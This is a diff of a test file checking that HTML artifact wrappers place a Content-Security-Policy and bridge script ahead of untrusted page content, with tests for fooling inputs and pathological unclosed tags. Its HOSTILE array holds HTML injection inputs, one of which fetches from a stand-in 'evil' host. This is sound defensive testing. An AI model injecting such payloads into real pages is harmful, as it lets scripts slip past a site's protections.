@@ -1,5 +1,5 @@
 import { describe, expect, test } from "bun:test";
-import { artifactDocument, policyFirstDocument, webViewDocument } from "@godmode/shared";
+import { artifactDocument, policyFirstDocument, standaloneDocument, webViewDocument } from "@godmode/shared";
 
 const POLICY = `<meta http-equiv="Content-Security-Policy" content="default-src 'none'">`;
 const OPEN = `<!doctype html><html><head><meta charset="utf-8">${POLICY}`;
@@ -14,13 +14,7 @@ const HOSTILE = [
   "</head></html><script>fetch('http://evil')</script>",
 ];
 
-describe("a document for a native WebView", () => {
-  test("the shared regex can be fooled: it puts the policy inside a title, or after a script", () => {
-    expect(artifactDocument(HOSTILE[0]!, POLICY)).toContain(`<title><head>${POLICY}`);
-    const late = artifactDocument(HOSTILE[1]!, POLICY);
-    expect(late.indexOf("fetch(")).toBeLessThan(late.indexOf(POLICY));
-  });
-
+describe("every artifact document", () => {
   test("the policy and the bridge come before every byte of the page, whatever the page holds", () => {
     for (const html of HOSTILE) {
       const doc = policyFirstDocument(html, POLICY);
@@ -41,6 +35,37 @@ describe("a document for a native WebView", () => {
     expect(doc.startsWith(`<!doctype html><html><head><meta charset="utf-8"><meta name="viewport"`)).toBe(true);
     for (const part of [`http-equiv="Content-Security-Policy"`, "ReactNativeWebView", "window.godmode=g"]) expect(doc.indexOf(part)).toBeLessThan(page);
     expect(doc.indexOf(`classList.add(...["h-full","md:flex"])`)).toBeLessThan(doc.indexOf("window.godmode=g"));
+  });
+
+  test("the download and the desktop's frame put the page behind their policy and bridge too", () => {
+    const html = `<title><head></title><script>pageCode()</script><html class="h-full"><body>hi</body></html>`;
+    for (const doc of [standaloneDocument(html, null, "dark"), artifactDocument(html, "<script>bridge()</script>")]) {
+      const page = doc.indexOf("<title><head>");
+      expect(doc.startsWith(`<!doctype html><html><head><meta charset="utf-8">`)).toBe(true);
+      expect(doc.indexOf(`classList.add(...["h-full"])`)).toBeLessThan(page);
+      expect(doc.slice(0, page)).not.toContain("pageCode()");
+    }
+    const download = standaloneDocument(html, null, "dark");
+    expect(download.indexOf(`http-equiv="Content-Security-Policy"`)).toBeLessThan(download.indexOf("window.godmode=g"));
+    expect(download).toContain(`name="viewport"`);
+  });
+
+  test("a page full of openings that never close is looked at in one pass", () => {
+    for (const html of ["<!--".repeat(50_000), "<script ".repeat(30_000), "<html ".repeat(40_000), "<!--x-->".repeat(30_000) + "<script></script>".repeat(10_000)]) {
+      const started = performance.now();
+      policyFirstDocument(html, POLICY);
+      webViewDocument(html, "tok", null, "dark");
+      expect(performance.now() - started).toBeLessThan(250);
+    }
+  });
+
+  test("what is in a comment or a script, closed or not, makes no page of a fragment", () => {
+    for (const html of ["<!-- <body> --><p>hi</p>", "<!-- <body> <p>hi</p>", "<script>'<html>'</script><p>hi</p>", "<SCRIPT>'<head>'</SCRIPT ><p>hi</p>", "<script>'<html>'"]) {
+      expect(policyFirstDocument(html, POLICY)).toContain(`</head><body>${html}`);
+    }
+    for (const html of ["<!-- x --><HEAD></HEAD>", "<scripty><body>", "<script>a</script>\n<body class=\"x\">"]) {
+      expect(policyFirstDocument(html, POLICY)).toBe(`${OPEN}</head>${html}`);
+    }
   });
 
   test("only plain classes are carried over: nothing a page can break out of", () => {
